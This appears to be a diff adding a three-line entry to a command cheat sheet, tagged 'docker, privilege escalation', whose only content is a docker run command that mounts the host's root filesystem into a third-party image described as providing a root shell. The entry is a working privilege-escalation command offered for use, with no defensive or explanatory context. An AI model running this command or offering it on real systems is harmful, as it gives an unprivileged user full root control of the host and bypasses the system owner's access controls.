@@ -1,0 +1,3 @@
+% docker, privilege escalation
+# Docker image that provides root shell
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
